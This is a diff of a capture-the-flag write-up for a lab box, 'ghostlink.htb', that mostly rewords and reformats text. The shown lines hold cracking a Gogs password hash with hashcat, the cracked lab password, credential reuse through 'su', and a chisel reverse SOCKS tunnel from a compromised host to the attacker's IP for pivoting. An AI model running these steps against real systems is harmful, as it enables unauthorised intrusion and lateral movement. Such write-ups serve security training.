@@ -430,7 +430,7 @@ id  name             email                    is_admin
 5   ohexley          ohexley@ghostlink.htb    0
 ```
 
-Gogs salts and hashes passwords with PBKDF2-HMAC-SHA256. Converting `nvirelli`'s hash/salt into hashcat's format with a small helper script and cracking it:
+Gogs salts and hashes passwords with PBKDF2-HMAC-SHA256. Converting `nvirelli`'s hash/salt into hashcat's format with [GogsToHashcat](https://github.com/shinris3n/GogsToHashcat) and cracking it:
 
 ```
 python3 GogsToHashcat.py -n 10000 -o nvirelli.hash <salt> <hash>
@@ -439,7 +439,7 @@ hashcat -m 10900 nvirelli.hash /usr/share/wordlists/rockyou.txt
 nvirelli:u47YUclrDiwWxBheaSzI
 ```
 
-`nvirelli` is also an admin account, and — credential reuse between the domain and this Linux host — also has a local account here:
+`nvirelli` is also an admin account, and credential reuse between the domain and this host grants access on the Linux host :
 
 ```
 su nvirelli
@@ -469,13 +469,16 @@ SMB  ... [*] Enumerated 11 local users: GHOSTLINK
 
 No immediately exploitable shares or BloodHound edges turn up with `nvirelli`'s rights. Deeper access requires reaching the internal `172.16.20.0/24` segment where the certificate authority lives, so a chisel SOCKS tunnel is built from the already-compromised toolkits host:
 
+>Kali:
+
 ```
-# Kali
 ./chisel server -v -p 1234 --reverse --socks5
 ```
 
+
+>gpz-op26-toolkits
+
 ```
-# gpz-op26-toolkits
 ./chisel client -v 10.10.14.148:1234 R:socks
 ```
 
